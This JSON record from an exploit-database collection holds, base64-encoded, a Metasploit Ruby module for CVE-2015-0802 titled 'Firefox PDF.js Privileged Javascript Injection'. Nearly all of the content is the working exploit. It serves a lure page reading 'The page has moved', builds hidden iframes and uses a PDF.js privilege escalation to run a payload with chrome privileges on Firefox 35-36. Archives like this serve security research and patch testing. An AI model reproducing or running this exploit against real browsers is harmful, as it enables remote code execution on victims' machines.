{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdDMgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gTWFudWFsUmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJFeHBsb2l0U2VydmVyDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkZpcmVmb3hQcml2aWxlZ2VFc2NhbGF0aW9uDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbz17fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICA9PiAnRmlyZWZveCBQREYuanMgUHJpdmlsZWdlZCBKYXZhc2NyaXB0IEluamVjdGlvbicsDQogICAgICAnRGVzY3JpcHRpb24nID0+ICVxew0KICAgICAgICBUaGlzIG1vZHVsZSBnYWlucyByZW1vdGUgY29kZSBleGVjdXRpb24gb24gRmlyZWZveCAzNS0zNiBieSBhYnVzaW5nIGENCiAgICAgICAgcHJpdmlsZWdlIGVzY2FsYXRpb24gYnVnIGluIHJlc291cmNlOi8vIFVSSXMuIFBERi5qcyBpcyB1c2VkIHRvIGV4cGxvaXQNCiAgICAgICAgdGhlIGJ1Zy4gVGhpcyBleHBsb2l0IHJlcXVpcmVzIHRoZSB1c2VyIHRvIGNsaWNrIGFueXdoZXJlIG9uIHRoZSBwYWdlIHRvDQogICAgICAgIHRyaWdnZXIgdGhlIHZ1bG5lcmFiaWxpdHkuDQogICAgICB9LA0KICAgICAgJ0F1dGhvcicgICAgICAgICA9PiBbDQogICAgICAgICdVbmtub3duJywgIyBQREYuanMgaW5qZWN0aW9uIGNvZGUgd2FzIHRha2VuIGZyb20gYSAwZGF5DQogICAgICAgICdNYXJpdXMgTWx5bnNraScsICMgZGlzY292ZXJ5IGFuZCBwd24yb3duIGV4cGxvaXQNCiAgICAgICAgJ2pvZXYnICAgICAjIGNvcHlwYXN0YSBtb25rZXksIENWRS0yMDE1LTA4MDINCiAgICAgIF0sDQogICAgICAnRGlzY2xvc3VyZURhdGUnID0+ICJNYXIgMzEgMjAxNSIsDQogICAgICAnTGljZW5zZScgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ1JlZmVyZW5jZXMnID0+DQogICAgICAgIFsNCiAgICAgICAgICBbJ0NWRScsICcyMDE1LTA4MTYnXSwgIyBwZGYuanMgY2FuIGxvYWQgY2hyb21lOi8vDQogICAgICAgICAgWydDVkUnLCAnMjAxNS0wODAyJ10gICMgY2FuIGFjY2VzcyBtZXNzYWdlTWFuYWdlciBwcm9wZXJ0eSBpbiBjaHJvbWUgd2luZG93DQogICAgICAgIF0sDQogICAgICAnVGFyZ2V0cycgPT4gWw0KICAgICAgICBbDQogICAgICAgICAgJ1VuaXZlcnNhbCAoSmF2YXNjcmlwdCBYUENPTSBTaGVsbCknLCB7DQogICAgICAgICAgICAnUGxhdGZvcm0nID0+ICdmaXJlZm94JywNCiAgICAgICAgICAgICdBcmNoJyA9PiBBUkNIX0ZJUkVGT1gNCiAgICAgICAgICB9DQogICAgICAgIF0sDQogICAgICAgIFsNCiAgICAgICAgICAnTmF0aXZlIFBheWxvYWQnLCB7DQogICAgICAgICAgICAnUGxhdGZvcm0nID0+ICV3eyBqYXZhIGxpbnV4IG9zeCBzb2xhcmlzIHdpbiB9LA0KICAgICAgICAgICAgJ0FyY2gnICAgICA9PiBBUkNIX0FMTA0KICAgICAgICAgIH0NCiAgICAgICAgXQ0KICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyA9PiAwLA0KICAgICAgJ0Jyb3dzZXJSZXF1aXJlbWVudHMnID0+IHsNCiAgICAgICAgOnNvdXJjZSAgPT4gJ3NjcmlwdCcsDQogICAgICAgIDp1YV9uYW1lID0+IEh0dHBDbGllbnRzOjpGRiwNCiAgICAgICAgOnVhX3ZlciAgPT4gbGFtYmRhIHsgfHZlcnwgdmVyLnRvX2kuYmV0d2Vlbj8oMzUsIDM2KSB9DQogICAgICB9DQogICAgKSkNCg0KICAgIHJlZ2lzdGVyX29wdGlvbnMoWw0KICAgICAgT3B0U3RyaW5nLm5ldygnQ09OVEVOVCcsIFsgZmFsc2UsICJDb250ZW50IHRvIGRpc3BsYXkgaW5zaWRlIHRoZSBIVE1MIDxib2R5Pi4iIF0pDQogICAgXSwgc2VsZi5jbGFzcykNCiAgZW5kDQoNCiAgZGVmIG9uX3JlcXVlc3RfZXhwbG9pdChjbGksIHJlcXVlc3QsIHRhcmdldF9pbmZvKQ0KICAgIHByaW50X3N0YXR1cygnU2VuZGluZyBleHBsb2l0Li4uJykNCiAgICBzZW5kX3Jlc3BvbnNlX2h0bWwoY2xpLCBodG1sKQ0KICBlbmQNCg0KICBkZWYgaHRtbA0KICAgICI8IWRvY3R5cGUgaHRtbD48aHRtbD48Ym9keT4je2RhdGFzdG9yZVsnQ09OVEVOVCddIHx8IGRlZmF1bHRfaHRtbH0iKw0KICAgICI8c2NyaXB0PiN7anN9PC9zY3JpcHQ+PC9ib2R5PjwvaHRtbD4iDQogIGVuZA0KDQogIGRlZiBkZWZhdWx0X2h0bWwNCiAgICAiVGhlIHBhZ2UgaGFzIG1vdmVkLiA8c3BhbiBzdHlsZT0ndGV4dC1kZWNvcmF0aW9uOnVuZGVybGluZTsnPkNsaWNrIGhlcmU8L3NwYW4+IHRvIGJlIHJlZGlyZWN0ZWQuIg0KICBlbmQNCg0KICBkZWYganMNCiAgICBrZXkgPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDUgKyByYW5kKDEyKSkNCiAgICBmcmFtZSA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNSArIHJhbmQoMTIpKQ0KICAgIHIgPSBSZXg6OlRleHQucmFuZF90ZXh0X2FscGhhKDUgKyByYW5kKDEyKSkNCiAgICBvcHRzID0geyBrZXkgPT4gcnVuX3BheWxvYWQgfSAjIGRlZmluZWQgaW4gRmlyZWZveFByaXZpbGVnZUVzY2FsYXRpb24gbWl4aW4NCg0KICAgIDw8LUVPSlMNCmZ1bmN0aW9uIHhtbDJzdHJpbmcob2JqKSB7DQogIHJldHVybiBuZXcgWE1MU2VyaWFsaXplcigpLnNlcmlhbGl6ZVRvU3RyaW5nKG9iaik7DQp9DQoNCmZ1bmN0aW9uIF9fcHJvdG8ob2JqKSB7DQogIHJldHVybiBvYmouX19wcm90b19fLl9fcHJvdG9fXy5fX3Byb3RvX18uX19wcm90b19fLl9fcHJvdG9fXy5fX3Byb3RvX187DQp9DQoNCmZ1bmN0aW9uIGdldChwYXRoLCBjYWxsYmFjaywgdGltZW91dCwgdGVtcGxhdGUsIHZhbHVlKSB7DQogIGNhbGxiYWNrID0gXyhjYWxsYmFjayk7DQogIGlmICh0ZW1wbGF0ZSAmJiB2YWx1ZSkgew0KICAgIGNhbGxiYWNrID0gY2FsbGJhY2sucmVwbGFjZSh0ZW1wbGF0ZSwgdmFsdWUpOw0KICB9DQogIGpzX2NhbGwxID0gJ2phdmFzY3JpcHQ6JyArIF8oZnVuY3Rpb24oKSB7DQogICAgdHJ5IHsNCiAgICAgIGRvbmUgPSBmYWxzZTsNCiAgICAgIHdpbmRvdy5vbmNsaWNrID0gZnVuY3Rpb24oKSB7DQogICAgICAgIGlmIChkb25lKSB7IHJldHVybjsgfSBkb25lID0gdHJ1ZTsNCiAgICAgICAgcSA9IG9wZW4oIiV1cmwlIiwgInEiLCAiY2hyb21lLCx0b3A9LTk5OTlweCxsZWZ0PS05OTk5cHgsaGVpZ2h0PTFweCx3aWR0aD0xcHgiKTsNCiAgICAgICAgc2V0VGltZW91dChmdW5jdGlvbigpew0KICAgICAgICAgIHEubG9jYXRpb249J2RhdGE6dGV4dC9odG1sLDxpZnJhbWUgbW96YnJvd3NlciBzcmM9ImFib3V0OmJsYW5rIj48L2lmcmFtZT4nOw0KDQogICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICAgIHZhciBvcHRzID0gI3tKU09OLnVucGFyc2Uob3B0cyl9Ow0KICAgICAgICAgICAgICB2YXIga2V5ID0gb3B0c1snI3trZXl9J107DQogICAgICAgICAgICAgIHEubWVzc2FnZU1hbmFnZXIubG9hZEZyYW1lU2NyaXB0KCdkYXRhOiwnK2tleSwgZmFsc2UpOw0KICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7DQogICAgICAgICAgICAgICAgcS5jbG9zZSgpOw0KICAgICAgICAgICAgICB9LCAxMDApDQogICAgICAgICAgICB9LCAxMDApDQogICAgICAgIH0sIDEwMCk7DQogICAgICB9DQogICAgfSBjYXRjaCAoZSkgew0KICAgICAgaGlzdG9yeS5iYWNrKCk7DQogICAgfQ0KICAgIHVuZGVmaW5lZDsNCiAgfSwgIiV1cmwlIiwgcGF0aCk7DQogIGpzX2NhbGwyID0gJ2phdmFzY3JpcHQ6O3RyeXt1cGRhdGVIaWRkZW4oKTt9Y2F0Y2goZSl7fTsnICsgY2FsbGJhY2sgKyAnO3VuZGVmaW5lZCc7DQogIHNhbmRib3hDb250ZXh0KF8oZnVuY3Rpb24oKSB7DQogICAgcCA9IF9fcHJvdG8oaS5jb250ZW50RG9jdW1lbnQuc3R5bGVTaGVldHNbMF0ub3duZXJOb2RlKTsNCiAgICBsID0gcC5fX2xvb2t1cFNldHRlcl9fLmNhbGwoaTIuY29udGVudFdpbmRvdywgJ2xvY2F0aW9uJyk7DQogICAgbC5jYWxsKGkyLmNvbnRlbnRXaW5kb3csIHdpbmRvdy53cmFwcGVkSlNPYmplY3QuanNfY2FsbDEpOw0KICB9KSk7DQogIHNldFRpbWVvdXQoKGZ1bmN0aW9uKCkgew0KICAgIHNhbmRib3hDb250ZXh0KF8oZnVuY3Rpb24oKSB7DQogICAgICBwID0gX19wcm90byhpLmNvbnRlbnREb2N1bWVudC5zdHlsZVNoZWV0c1swXS5vd25lck5vZGUpOw0KICAgICAgbCA9IHAuX19sb29rdXBTZXR0ZXJfXy5jYWxsKGkyLmNvbnRlbnRXaW5kb3csICdsb2NhdGlvbicpOw0KICAgICAgbC5jYWxsKGkyLmNvbnRlbnRXaW5kb3csIHdpbmRvdy53cmFwcGVkSlNPYmplY3QuanNfY2FsbDIpOw0KICAgIH0pKTsNCiAgfSksIHRpbWVvdXQpOw0KfQ0KDQpmdW5jdGlvbiBnZXRfZGF0YShvYmopIHsNCiAgZGF0YSA9IG51bGw7DQogIHRyeSB7DQogICAgZGF0YSA9IG9iai5kb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuaW5uZXJIVE1MOw0KICAgIGlmIChkYXRhLmluZGV4T2YoJ2Rpckxpc3RpbmcnKSA8IDApIHsNCiAgICAgIHRocm93IG5ldyBFcnJvcigpOw0KICAgIH0NCiAgfSBjYXRjaCAoZSkgew0KICAgIGlmICh0aGlzLmRvY3VtZW50IGluc3RhbmNlb2YgWE1MRG9jdW1lbnQpIHsNCiAgICAgICAgZGF0YSA9IHhtbDJzdHJpbmcodGhpcy5kb2N1bWVudCk7DQogICAgfSBlbHNlIHsNCiAgICAgIHRyeSB7DQogICAgICAgICAgaWYgKHRoaXMuZG9jdW1lbnQuYm9keS5maXJzdENoaWxkLm5vZGVOYW1lLnRvVXBwZXJDYXNlKCkgPT0gJ1BSRScpIHsNCiAgICAgICAgICAgICAgZGF0YSA9IHRoaXMuZG9jdW1lbnQuYm9keS5maXJzdENoaWxkLnRleHRDb250ZW50Ow0KICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgIHRocm93IG5ldyBFcnJvcigpOw0KICAgICAgICAgIH0NCiAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICBpZiAodGhpcy5kb2N1bWVudC5ib2R5LmJhc2VVUkkuaW5kZXhPZigncGRmLmpzJykgPj0gMCB8fCBkYXRhLmluZGV4T2YoJ2Fib3V0TmV0RXJyb3InKSA+IC0xKSB7Ow0KICAgICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoKTsNCiAgICAgICAgICB9DQogICAgICAgIH0gY2F0Y2ggKGUpIHsNCiAgICAgICAgICA7Ow0KICAgICAgICB9DQogICAgICB9DQogICAgfQ0KICB9DQogIHJldHVybiBkYXRhOw0KfQ0KDQpmdW5jdGlvbiBfKHMsIHRlbXBsYXRlLCB2YWx1ZSkgew0KICBzID0gcy50b1N0cmluZygpLnNwbGl0KC9eXFxzKmZ1bmN0aW9uXFxzK1xcKFxccypcXClcXHMqXFx7LylbMV07DQogIHMgPSBzLnN1YnN0cmluZygwLCBzLmxlbmd0aCAtIDEpOw0KICBpZiAodGVtcGxhdGUgJiYgdmFsdWUpIHsNCiAgICBzID0gcy5yZXBsYWNlKHRlbXBsYXRlLCB2YWx1ZSk7DQogIH0NCiAgcyArPSBfX3Byb3RvOw0KICBzICs9IHhtbDJzdHJpbmc7DQogIHMgKz0gZ2V0X2RhdGE7DQogIHMgPSBzLnJlcGxhY2UoL1xcc1xcL1xcLy4qXFxuL2csICIiKTsNCiAgcyA9IHMgKyAiO3VuZGVmaW5lZCI7DQogIHJldHVybiBzOw0KfQ0KDQpmdW5jdGlvbiBnZXRfc2FuZGJveF9jb250ZXh0KCkgew0KICBpZiAod2luZG93Lm15X3dpbl9pZCA9PSBudWxsKSB7DQogICAgZm9yICh2YXIgaSA9IDA7IGkgPCAyMDsgaSsrKSB7DQogICAgICB0cnkgew0KICAgICAgICBpZiAod2luZG93W2ldLmxvY2F0aW9uLnRvU3RyaW5nKCkuaW5kZXhPZigidmlldy1zb3VyY2U6IikgIT0gLTEpIHsNCiAgICAgICAgICBteV93aW5faWQgPSBpOw0KICAgICAgICAgIGJyZWFrOw0KICAgICAgICB9DQogICAgICB9IGNhdGNoIChlKSB7fQ0KICAgIH0NCiAgfTsNCiAgaWYgKHdpbmRvdy5teV93aW5faWQgPT0gbnVsbCkNCiAgICByZXR1cm47DQogIGNsZWFySW50ZXJ2YWwoc2FuZGJveF9jb250ZXh0X2kpOw0KICBvYmplY3QuZGF0YSA9ICd2aWV3LXNvdXJjZTonICsgYmxvYlVSTDsNCiAgd2luZG93W215X3dpbl9pZF0ubG9jYXRpb24gPSAnZGF0YTphcHBsaWNhdGlvbi94LW1vei1wbGF5cHJldmlldy1wZGZqczssJzsNCiAgb2JqZWN0LmRhdGEgPSAnZGF0YTp0ZXh0L2h0bWwsPCcrJ2h0bWwvPic7DQogIHdpbmRvd1tteV93aW5faWRdLmZyYW1lRWxlbWVudC5pbnNlcnRBZGphY2VudEhUTUwoJ2JlZm9yZWJlZ2luJywgJzxpZnJhbWUgc3R5bGU9JysNCiAgICAnInBvc2l0aW9uOmFic29sdXRlOyBsZWZ0Oi05OTk5cHg7IiBvbmxvYWQgPSAiJytfKGZ1bmN0aW9uKCl7DQogICAgd2luZG93LndyYXBwZWRKU09iamVjdC5zYW5kYm94Q29udGV4dD0oZnVuY3Rpb24oY21kKSB7DQogICAgICB3aXRoKGltcG9ydEZ1bmN0aW9uLmNvbnN0cnVjdG9yKCdyZXR1cm4gdGhpcycpKCkpIHsNCiAgICAgICAgcmV0dXJuIGV2YWwoY21kKTsNCiAgICAgIH0NCiAgICB9KTsNCiAgfSkgKyAnIi8+Jyk7DQp9DQoNCnZhciBISURERU4gPSAncG9zaXRpb246YWJzb2x1dGU7bGVmdDotOTk5OXB4O2hlaWdodDoxcHg7d2lkdGg6MXB4Oyc7DQp2YXIgaSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImlmcmFtZSIpOw0KaS5pZCA9ICJpIjsNCmkuc3R5bGU9SElEREVOOw0KaS5zcmMgPSAiZGF0YTphcHBsaWNhdGlvbi94bWwsPD94bWwgdmVyc2lvbj1cXCIxLjBcXCI/PjxlPjxlMT48L2UxPjwvZT4iOw0KZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmFwcGVuZENoaWxkKGkpOw0KaS5vbmxvYWQgPSBmdW5jdGlvbigpIHsNCiAgaWYgKHRoaXMuY29udGVudERvY3VtZW50LnN0eWxlU2hlZXRzLmxlbmd0aCA+IDApIHsNCiAgICB2YXIgaTIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpZnJhbWUiKTsNCiAgICBpMi5pZCA9ICJpMiI7DQogICAgaTIuc3R5bGU9J29wYWNpdHk6IDA7cG9zaXRpb246YWJzb2x1dGU7dG9wOjA7bGVmdDowO3JpZ2h0OjA7Ym90dG9tOjA7JzsNCiAgICBpMi5oZWlnaHQgPSB3aW5kb3cuaW5uZXJIZWlnaHQrJ3B4JzsNCiAgICBpMi53aWR0aCA9IHdpbmRvdy5pbm5lcldpZHRoKydweCc7DQogICAgaTIuc3JjID0gImRhdGE6YXBwbGljYXRpb24vcGRmLCI7DQogICAgZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmFwcGVuZENoaWxkKGkyKTsNCiAgICBwZGZCbG9iID0gbmV3IEJsb2IoWycnXSwgew0KICAgICAgICB0eXBlOiAnYXBwbGljYXRpb24vcGRmJw0KICAgIH0pOw0KICAgIGJsb2JVUkwgPSBVUkwuY3JlYXRlT2JqZWN0VVJMKHBkZkJsb2IpOw0KICAgIG9iamVjdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ29iamVjdCcpOw0KICAgIG9iamVjdC5zdHlsZT1ISURERU47DQogICAgb2JqZWN0LmRhdGEgPSAnZGF0YTphcHBsaWNhdGlvbi9wZGYsJzsNCiAgICBvYmplY3Qub25sb2FkID0gKGZ1bmN0aW9uKCkgew0KICAgICAgICBzYW5kYm94X2NvbnRleHRfaSA9IHNldEludGVydmFsKGdldF9zYW5kYm94X2NvbnRleHQsIDIwMCk7DQogICAgICAgIG9iamVjdC5vbmxvYWQgPSBudWxsOw0KICAgICAgICBvYmplY3QuZGF0YSA9ICd2aWV3LXNvdXJjZTonICsgbG9jYXRpb24uaHJlZjsNCiAgICAgICAgcmV0dXJuOw0KICAgIH0pOw0KICAgIGRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChvYmplY3QpOw0KICB9IGVsc2Ugew0KICAgIHRoaXMuY29udGVudFdpbmRvdy5sb2NhdGlvbi5yZWxvYWQoKTsNCiAgfQ0KfQ0KDQpkb2N1bWVudC5ib2R5LnN0eWxlLmhlaWdodCA9IHdpbmRvdy5pbm5lckhlaWdodCsncHgnOw0KDQp2YXIga2lsbCA9IHNldEludGVydmFsKGZ1bmN0aW9uKCkgew0KICBpZiAod2luZG93LnNhbmRib3hDb250ZXh0KSB7DQogICAgdmFyIGYgPSAiY2hyb21lOi8vYnJvd3Nlci9jb250ZW50L2Jyb3dzZXIueHVsIjsNCiAgICBnZXQoZiwgZnVuY3Rpb24oKSB7fSwgMCwgIiVVUkwlIiwgZik7DQogICAgY2xlYXJJbnRlcnZhbChraWxsKTsNCiAgfSBlbHNlIHsNCiAgICByZXR1cm47DQogIH0NCn0sMjApOw0KDQpFT0pTDQogIGVuZA0KZW5k", 
    "filename": "platforms/multiple/remote/37958.rb", 
    "id": "37958", 
    "cves": [
        "CVE-2015-0802"
    ]
}